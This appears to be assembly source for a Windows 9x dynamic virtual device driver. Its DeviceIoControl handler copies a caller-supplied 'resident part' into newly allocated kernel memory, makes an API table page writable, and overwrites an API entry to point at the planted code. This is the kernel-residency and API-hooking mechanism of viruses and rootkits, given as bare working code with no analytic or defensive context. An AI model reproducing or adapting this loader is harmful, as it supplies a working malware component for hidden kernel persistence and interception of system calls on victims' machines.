.386p 
include vmm.inc 
include vwin32.inc
include shell.inc 

DECLARE_VIRTUAL_DEVICE DYNAVXD,1,0, DYNAVXD_Control,\ 
UNDEFINED_DEVICE_ID, UNDEFINED_INIT_ORDER 

Begin_control_dispatch DYNAVXD 
         Control_Dispatch w32_DeviceIoControl, OnDeviceIoControl 
End_control_dispatch DYNAVXD 

VxD_PAGEABLE_DATA_SEG 
inputoffset     dd 0
outputoffset    dd 0
VxD_PAGEABLE_DATA_ENDS 
     
VxD_PAGEABLE_CODE_SEG 
     BeginProc OnDeviceIoControl 
         assume esi:ptr DIOCParams 
         .if [esi].dwIoControlCode==DIOC_Open 
             xor eax,eax
         .elseif [esi].dwIoControlCode==1
           mov eax,[esi].lpvOutBuffer
           mov dword ptr [outputoffset],eax
           mov eax,[esi].lpvInBuffer
           mov dword ptr [inputoffset],eax
           mov ebx,dword ptr [eax+4]                   ;offsets of buffers are saved now
           push ebx
           VMMCall _HeapAllocate,<ebx,HEAPZEROINIT>    ;get some memory 
           mov ebx,dword ptr [outputoffset]
           pop ecx                                     ;byte counter for later 
           mov dword ptr [ebx],eax                     ;copy memoryaddress to outputbuffer 
           push eax                                    ;save address for later 
           
           mov edi,eax
           mov ebx,dword ptr [inputoffset]
           mov esi,dword ptr [ebx]
           rep movsb                                   ;copied the resident part into memory 

           mov eax,dword ptr [inputoffset]
           mov ebx,dword ptr [eax+8]
           push    020060000h              ; New page attributes (writ.)
           push    000000000h              ; uninteresting
           push    000000001h              ; Number of pages
           push    ebx                     ; page             
         VMMCall _PageModifyPermissions              ;the api table is now writeable  
           pop ebx
           pop eax
           pop eax
           pop eax

           pop eax
           mov edx,dword ptr [inputoffset]
           sub eax,dword ptr [edx+12]
           mov dword ptr [ebx],eax                     ;the new APIoffset is written to kernel 

         .endif 
         ret 
     EndProc OnDeviceIoControl 
VxD_PAGEABLE_CODE_ENDS 

     end
